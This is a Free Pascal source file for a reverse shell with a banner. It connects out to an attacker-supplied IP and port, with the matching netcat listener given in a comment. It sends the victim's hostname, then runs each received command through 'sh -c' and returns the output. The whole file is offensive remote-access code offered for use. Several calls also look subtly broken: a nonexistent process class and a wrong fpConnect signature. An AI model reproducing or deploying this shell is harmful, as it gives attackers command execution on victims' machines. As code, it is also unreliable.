program ReverseShell; // nc -l -p 13377

uses
  SysUtils, BaseUnix;

var
  We: String;
  ClientIp, Ip: String;
  Po: Integer;
  Cmd, Output, CmdOutput: String;
  Socket: cint;
  Line: String;

function ExecuteCommand(const Cmd: String): String;
var
  CommandOutput: TProcessOutput;
  Line: String;
begin
  CommandOutput := TProcessOutput.Create(nil);
  CommandOutput.Command := 'sh';
  CommandOutput.Parameters.Add('-c');
  CommandOutput.Parameters.Add(Cmd);
  CommandOutput.Execute;
  Result := '';
  while CommandOutput.Output.NumBytesAvailable > 0 do
  begin
    CommandOutput.Output.Read(Line, 1);
    Result := Result + Line;
  end;
  CommandOutput.Free;
end;

begin
  We := '  _____            _      _____          _      ' + LineEnding +
        ' |  __ \          | |    / ____|        | |     ' + LineEnding +
        ' | |__) |___  __ _| |___| |     ___   __| | ___ ' + LineEnding +
        ' |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \' + LineEnding +
        ' | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/' + LineEnding +
        ' |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|';

  ClientIp := GetHostName;
  Ip := '127.0.0.1';  // Default IP address
  Po := 13377;        // Default port

  if ParamCount < 2 then
  begin
    WriteLn('Please provide the IP address and port as command-line arguments.');
    Halt;
  end
  else
  begin
    Ip := ParamStr(1);
    Po := StrToInt(ParamStr(2));
  end;

  We := We + 'Client IP: ' + ClientIp + LineEnding;

  Socket := fpsocket(AF_INET, SOCK_STREAM, 0);

  if fpConnect(Socket, Ip, Po) < 0 then
  begin
    WriteLn('Connection error');
    Halt;
  end;

  fpSend(Socket, PChar(We), Length(We), 0);

  repeat
    fpSend(Socket, PChar(' $ '), 3, 0);
    SetLength(Cmd, 4096);
    fpRecv(Socket, PChar(Cmd), 4096, 0);
    Cmd := Trim(Cmd);

    if Cmd = 'exit' then
      Break;

    CmdOutput := ExecuteCommand(Cmd);
    fpSend(Socket, PChar(CmdOutput), Length(CmdOutput), 0);
  until False;

  fpClose(Socket);
end.
